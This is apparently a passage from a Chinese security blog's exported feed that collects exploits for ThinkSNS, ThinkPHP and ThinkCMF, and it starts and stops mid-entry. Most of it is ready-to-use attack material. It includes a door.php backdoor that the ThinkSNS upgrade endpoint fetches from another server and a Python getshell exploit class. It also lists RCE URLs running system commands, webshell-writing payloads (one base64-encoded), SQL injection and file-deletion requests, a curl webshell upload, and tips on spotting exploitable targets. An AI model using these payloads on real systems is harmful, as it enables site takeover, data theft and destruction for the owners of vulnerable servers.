mkdir(dirname($path), 0777, true);    file_put_contents($path, file_get_contents($downUrl));    file_exists($path) or $this-&gt;showError(&apos;下载升级包失败，请检查&apos;.dirname($path).&apos;目录是否可写，如果可写，请刷新重试！&apos;);    // 验证hash判断包是否合法。    $filename = dirname($path).&apos;/upgrade.json&apos;;    $data = file_get_contents($filename);    $data = json_decode($data, false);    if (md5_file($path) != $data-&gt;md5) {        $this-&gt;showError(&apos;更新包校验失败，请重新执行升级.&apos;);    }</code></pre><p>函数</p><pre><code>file_put_contents — 将一个字符串写入文件file_get_contents — 将整个文件读入一个字符串</code></pre><p>在这段函数中，先备份老配置文件，然后下载增量包，下载参数$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，<br>导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。</p><p>远程下载文件，在另一个服务器上创建door.php。</p><pre><code>&lt;?php   echo &quot;&lt;?php&quot;;echo &quot;eval(file_get_contents(&apos;php://input&apos;));&quot;;  echo &quot;?&gt;&quot;;  ?&gt;  </code></pre><p>远程下载     </p><p><code>http://127.0.0.1:8000/ts4/index.php?app=admin&amp;mod=Upgrade&amp;act=step1&amp;upurl=http://192.168.86.194:8000/door.php</code></p><p>会在<code>ts4\data\upgrade</code>出现下载的<code>door.php</code>文件。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448903598&amp;idx=1&amp;sn=597d488c492fca52b49b0f5ddddcadb8&amp;chksm=8b55ddf3bc2254e5135ff7f9a10cdde3ce710e32d53fb4575b02411a9b3bbe23ec26207f8196&amp;mpshare=1&amp;scene=23&amp;srcid=0311KzWTeNcTSxfCLzcIRd7F#rd" target="_blank" rel="noopener">ThinkSNS_V4 后台任意文件下载导致Getshell</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp_5.0.x%E9%80%9A%E6%9D%80gethell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp_5.0.x%E9%80%9A%E6%9D%80gethell/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># thinkphp 5.0.* 通杀getshell poc_1</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def post_command(host):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0",</span><br><span class="line">        "Content-Type": "application/x-www-form-urlencoded"</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        "_method": "__construct",</span><br><span class="line">        "filter[]": "system",</span><br><span class="line">        "method": "get",</span><br><span class="line">        "server[REQUEST_METHOD]": "echo 202cb962ac59075b964b07152d234b70 &gt; 11.php"</span><br><span class="line">    &#125;</span><br><span class="line">    target = host + "/public/index.php?s=captcha"</span><br><span class="line">    print("Request: &#123;&#125;".format(target))</span><br><span class="line">    r = requests.post(target, data=data, headers=headers)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 验证 11.php是否存在</span><br><span class="line">def md5_file_is_exist(host):</span><br><span class="line">    rs = requests.get(host+"/public/11.php")</span><br><span class="line">    if rs.status_code == 200 and "202cb962ac59075b964b07152d234b70" in rs.text:</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Exploit(object):</span><br><span class="line"></span><br><span class="line">    def attack(self, url):</span><br><span class="line">        post_command(url)</span><br><span class="line">        if md5_file_is_exist(url):</span><br><span class="line">            return "getshell ok. &#123;&#125;".format(url+"/public/11.php")</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-3-2-3-5-0-10-缓存函数设计缺陷"><a href="#ThinkPHP-3-2-3-5-0-10-缓存函数设计缺陷" class="headerlink" title="ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷"></a>ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><ul><li>ThinkPHP_3.2.3-5.0.10</li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>该漏洞复现起来比较复杂，虽然需要同时满足很多条件才可以导致GetShell，不过风险确实存在，对于黑客来说任何一点细微的风险都有可能是整个攻击链条中重要的一环。</p><p>根据先知论坛上dalao的讨论，触发代码执行漏洞至少需要同时满足以下条件：</p><ul><li><ol><li>开启缓存功能</li></ol></li><li><ol start="2"><li>缓存文件所在目录可以从浏览器直接访问</li></ol></li><li><ol start="3"><li>需要能够猜解出缓存的文件名（文件名生成有一定规律）</li></ol></li><li><ol start="4"><li>同时可以控制缓存文件里的内容（比如通过写入到数据库进而生成缓存文件）</li></ol></li></ul><p>个人在复现这个漏洞的时候发现 5.0.x 版本的 TP 并不能直接访问到缓存文件所在的目录，所以默认情况下不能触发该漏洞。在 3.2.x 版本是可以直接从浏览器访问到缓存文件的。</p><p>为了触发TP 3.2.3 Demo 的 GetShell 漏洞，先发起如下请求：</p><p><code>http://localhost/tp3.2.3/index.php/Home/Index/get?id=%0D%0Aeval($_POST[x]);//</code></p><p>下一步需要对缓存的文件名进行猜解，文件名的生成规则是缓存的key的MD5，所以黑盒情况下可以先算一些关键词的MD5，然后批量HEAD请求，发现响应200则说明存在这个缓存文件，或者结合源代码泄露漏洞进行利用，在这里我们直接从源码文件看到生成的文件：</p><p><img src="ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷/poc1.png" alt="poc1.png"></p><p>文件名 也正是 缓存 key （name） 的MD5 值：</p><p><code>md5(name,32) = b068931cc450442b63f5b3d276ea4297</code></p><p>最后，可以看到 b068931cc450442b63f5b3d276ea4297.php 的 内容为之前写进去的一句话木马：</p><p><img src="ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷/poc2.png" alt="poc2.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://xianzhi.aliyun.com/forum/topic/99（漏洞详情）" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/99（漏洞详情）</a></li><li><a href="http://www.thinkphp.cn/topic/51162.html（修复方案）" target="_blank" rel="noopener">http://www.thinkphp.cn/topic/51162.html（修复方案）</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.(-31)&amp;5.0.(-23)%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.(-31)&amp;5.0.(-23)%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>thinkphp5框架缺陷导致远程代码执行</td><td>2018-10-10</td><td>unknown</td><td><a href="http://www.thinkphp.cn/" target="_blank" rel="noopener">http://www.thinkphp.cn/</a></td><td><a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">下载连接</a></td><td>5.x &lt; 5.1.31, &lt;= 5.0.23</td><td><a href="https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ" target="_blank" rel="noopener">详情</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞   </p></blockquote><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.99.98:7878/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">http://192.168.99.98:7878/?s=index/\think\Request/input&amp;filter=system&amp;data=id</span><br><span class="line">http://192.168.99.98:7878/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">http://192.168.99.98:7878/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">http://192.168.99.98:7878/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">http://192.168.99.98:7878/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">http://192.168.99.98:7878/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">http://192.168.99.98:7878/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h5 id="一、控制器名引起的RCE"><a href="#一、控制器名引起的RCE" class="headerlink" title="一、控制器名引起的RCE"></a>一、控制器名引起的RCE</h5><h5 id="二、核心类Requests引起的RCE"><a href="#二、核心类Requests引起的RCE" class="headerlink" title="二、核心类Requests引起的RCE"></a>二、核心类Requests引起的RCE</h5><h3 id="一、控制器名引起的RCE-1"><a href="#一、控制器名引起的RCE-1" class="headerlink" title="一、控制器名引起的RCE"></a>一、控制器名引起的RCE</h3><h5 id="公开时间："><a href="#公开时间：" class="headerlink" title="公开时间："></a>公开时间：</h5><p>2018/12/09  </p><h5 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h5><p>ThinkPHP 5.0系列 &lt; 5.0.23<br>ThinkPHP 5.1系列 &lt; 5.1.31</p><p>poc:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5022/public/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=1</span><br></pre></td></tr></table></figure><p>exp:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5022/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>shell:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5022/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=a.php&amp;vars[1][]=&lt;?php eval(@$_POST[&apos;a&apos;]);?&gt;#shell地址http://127.0.0.1/tp5022/public/a.php</span><br></pre></td></tr></table></figure><h3 id="二、核心类Requests引起的RCE-1"><a href="#二、核心类Requests引起的RCE-1" class="headerlink" title="二、核心类Requests引起的RCE"></a>二、核心类Requests引起的RCE</h3><h5 id="公开时间：-1"><a href="#公开时间：-1" class="headerlink" title="公开时间："></a>公开时间：</h5><p>2019/01/11</p><h5 id="影响版本：-1"><a href="#影响版本：-1" class="headerlink" title="影响版本："></a>影响版本：</h5><p>5.0全系列，具体如下  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">版本名  是否可被攻击  攻击条件</span><br><span class="line">5.0.0   否           无</span><br><span class="line">5.0.1   否           无</span><br><span class="line">5.0.2   否           无</span><br><span class="line">5.0.3   否           无</span><br><span class="line">5.0.4   否           无</span><br><span class="line">5.0.5   否           无</span><br><span class="line">5.0.6   否           无</span><br><span class="line">5.0.7   否           无</span><br><span class="line">5.0.8   是           无需开启debug</span><br><span class="line">5.0.9   是           无需开启debug</span><br><span class="line">5.0.10  是           无需开启debug</span><br><span class="line">5.0.11  是           无需开启debug</span><br><span class="line">5.0.12  是           无需开启debug</span><br><span class="line">5.0.13  是           需开启debug</span><br><span class="line">5.0.14  是           需开启debug</span><br><span class="line">5.0.15  是           需开启debug</span><br><span class="line">5.0.16  是           需开启debug</span><br><span class="line">5.0.17  是           需开启debug</span><br><span class="line">5.0.18  是           需开启debug</span><br><span class="line">5.0.19  是           需开启debug</span><br><span class="line">5.0.20  否           无</span><br><span class="line">5.0.21  是           需开启debug</span><br><span class="line">5.0.22  是           需开启debug</span><br><span class="line">5.0.23  是           需开启debug</span><br><span class="line">5.0.24  否           无</span><br></pre></td></tr></table></figure><p>exp：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版本号：5.0.8~5.0.19s=whoami&amp;_method=__construct&amp;filter&amp;filter=system版本号：5.0.20~5.0.23_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami或_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure><p>具体请求包如下，留意下<code>Content-Type: application/x-www-form-urlencoded</code>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /tp5022/public/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: think_var=zh-cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E7%BC%93%E5%AD%98Getshell%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E7%BC%93%E5%AD%98Getshell%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>ThinkCMF X1.6.0</p><p>ThinkCMF X2.1.0</p><p>ThinkCMF X2.2.0 </p><p>ThinkCMF X2.2.1 </p><p>ThinkCMF X2.2.2</p><h3 id="漏洞详情-1"><a href="#漏洞详情-1" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p><strong>常规操作</strong></p><pre><code>http://wiki.bylibrary.cn/index.php?a=display&amp;templateFile=README.md&amp;content=%3C?php%20phpinfo();die();</code></pre><p><img src="图片/rId25.png" alt></p><p><strong>利用缓存文件getshell</strong></p><p>由于thinkcmf2.x使用了thinkphp3.x作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马m.php</p><p>日志文件格式为YY_MM_DD.log，如当前日期为2019年12月12日，日志文件为19_12_12.log，完整路径为</p><pre><code>data/runtime/Logs/Portal/19_12_12.log</code></pre><p><strong>payload 一</strong></p><p>首先访问</p><pre><code>http://wiki.bylibrary.cn/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E</code></pre><p>然后请求</p><pre><code>http://wiki.bylibrary.cn/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log</code></pre><p>即可在<a href="http://www.0-sec.org/根目录生成m.php，密码是X" target="_blank" rel="noopener">http://www.0-sec.org/根目录生成m.php，密码是X</a></p><p>payload 二</p><p>首先访问</p><pre><code>http://wiki.bylibrary.cn/?a=display&amp;templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E</code></pre><p>然后菜刀链接（密码也是x）</p><pre><code>http://wiki.bylibrary.cn/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="ThinkCMF漏洞全集和"><a href="#ThinkCMF漏洞全集和" class="headerlink" title="ThinkCMF漏洞全集和"></a>ThinkCMF漏洞全集和</h2><blockquote><p>…持续收集,欢迎贡献  </p></blockquote><ul><li>前台SQL注入:  <blockquote><p>需要普通用户权限，默认可注册<br>paylaod:  </p></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /ThinkCMFX/index.php?g=portal&amp;m=article&amp;a=edit_post HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 79</span><br><span class="line"></span><br><span class="line">post[id][0]=bind&amp;post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+-</span><br></pre></td></tr></table></figure><blockquote><p>还有以下可以测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">term:123</span><br><span class="line">post[post_title]:123</span><br><span class="line">post[post_title]:aaa</span><br><span class="line">post_title:123</span><br><span class="line">post[id][0]:bind</span><br></pre></td></tr></table></figure></p></blockquote><ul><li>前台模版注入漏洞-可getshell四处  </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 仅在Windows环境测试</span><br><span class="line"># 第一处  </span><br><span class="line">http://website/ThinkCMFX/index.php?g=Comment&amp;m=Widget&amp;a=fetch&amp;templateFile=/../public/index&amp;content=&lt;%3fphp+file_put_contents(&apos;m.php&apos;,&apos;&lt;%3fphp+eval($_POST[_])%3b&apos;);?&gt;&amp;prefix=</span><br><span class="line"># 第二处  </span><br><span class="line">http://website/ThinkCMFX/index.php?g=Api&amp;m=Plugin&amp;a=fetch&amp;templateFile=/../../../public/index&amp;content=&lt;%3fphp+file_put_contents(&apos;m.php&apos;,&apos;&lt;%3fphp+eval($_POST[_])%3b&apos;);?&gt;&amp;prefix=</span><br><span class="line"></span><br><span class="line"># 第三处  </span><br><span class="line">/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=&apos;&apos;&amp;content=&lt;php&gt;file_put_contents(&apos;test.php&apos;,&apos;&lt;?php phpinfo(); ?&gt;&apos;)&lt;/php&gt;</span><br><span class="line"></span><br><span class="line"># 第四处</span><br><span class="line">/index.php?a=fetch&amp;content=&lt;?php+file_put_contents(&quot;mrxn.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg==&quot;));</span><br></pre></td></tr></table></figure><ul><li><p>任意文件删除-只能windows删除  </p><blockquote><p>在用户上传头像处存在任意文件删除漏洞，发送如下数据包后，会删除网站根目录下一个名为 test.txt 的文件。（该漏洞仅能在 Windows 下触发）  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /ThinkCMFX/index.php?g=User&amp;m=Profile&amp;a=do_avatar&amp; HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">imgurl=..\..\..\test.txt</span><br></pre></td></tr></table></figure></blockquote></li><li><p>任意文件上传  </p><blockquote><p>在 ThinkCMFX2.2.3 最终版中，存在一处任意文件上传（需要普通用户权限，默认可注册）<br><code>curl -F &quot;file=@/tmp/shell.php&quot; -X &quot;POST&quot; -b &#39;PHPSESSID=qekmttucmue6vv41kpdjghnkd0;&#39; &#39;http://127.0.0.1/ThinkCMFX/index.php?g=Asset&amp;m=Ueditor&amp;a=upload&amp;action=uploadfile&#39;</code></p></blockquote></li><li><p>任意文件包含（读取数据库配置等等）<br><code>/index.php?a=display&amp;templateFile=README.md</code></p></li></ul><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><blockquote><p>thinkcmf 并没有死，并且有3版本与5版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。<br>1.看logo 3的logo是黄色的.<br>2.在网站url 后面输入 admin,如果页面是蓝色的表示是3的，可日穿之.<br>3.查看 README.md 在网站url后面输入README.md.<br>另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个<code>模板不存在</code>错:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url:http://thinkcmf.test/index.php?g=Comment&amp;m=Widget&amp;a=fetch</span><br><span class="line">post:</span><br><span class="line">templateFile=/../public/index</span><br><span class="line">prefix=&apos;&apos;</span><br><span class="line">content=&lt;php&gt;file_put_contents(&apos;test.php&apos;,&apos;&lt;?php eval($_REQUEST[11]);&apos;)&lt;/php&gt;</span><br></pre></td></tr></table></figure></p></blockquote><p>请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">/../public/index</span><br><span class="line">/../public/exception</span><br><span class="line">/../data/index</span><br><span class="line">/../data/runtime/index</span><br><span class="line">/../plugins/Mobileverify/View/admin_index</span><br><span class="line">/../plugins/Mobileverify/View/index</span><br><span class="line">/../plugins/Mobileverify/View/widget</span><br><span class="line">/../plugins/Demo/View/admin_index</span><br><span class="line">/../plugins/Demo/View/index</span><br><span class="line">/../plugins/Demo/View/widget</span><br><span class="line">/../application/Install/View/Public/footer</span><br><span class="line">/../application/Install/View/Public/head</span><br><span class="line">/../application/Install/View/Public/header</span><br><span class="line">/../application/Common/index</span><br><span class="line">/../application/Portal/Lang/en-us/index</span><br><span class="line">/../application/Api/Lang/en-us/index</span><br><span class="line">/../application/Api/Lang/zh-cn/index</span><br><span class="line">/../application/Comment/Lang/en-us/index</span><br><span class="line">/../application/Comment/Lang/zh-cn/index</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url:http://thinkcmf.test/index.php?g=Api&amp;m=Plugin&amp;a=fetch</span><br><span class="line">post:</span><br><span class="line">templateFile=/../../../public/index</span><br><span class="line">prefix=&apos;&apos;</span><br><span class="line">content=&lt;php&gt;file_put_contents(&apos;test1.php&apos;,&apos;&lt;?php eval($_REQUEST[11]);&apos;)&lt;/php&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/../../../public/index</span><br><span class="line">/../../../public/exception</span><br><span class="line">/../../../data/index</span><br><span class="line">/../../../data/runtime/index</span><br><span class="line">/../../../plugins/Mobileverify/View/admin_index</span><br><span class="line">/../../../plugins/Mobileverify/View/index</span><br><span class="line">/../../../plugins/Mobileverify/View/widget</span><br><span class="line">/../../../plugins/Demo/View/admin_index</span><br><span class="line">/../../../plugins/Demo/View/index</span><br><span class="line">/../../../plugins/Demo/View/widget</span><br><span class="line">/../../../application/Install/View/Public/footer</span><br><span class="line">/../../../application/Install/View/Public/head</span><br><span class="line">/../../../application/Install/View/Public/header</span><br><span 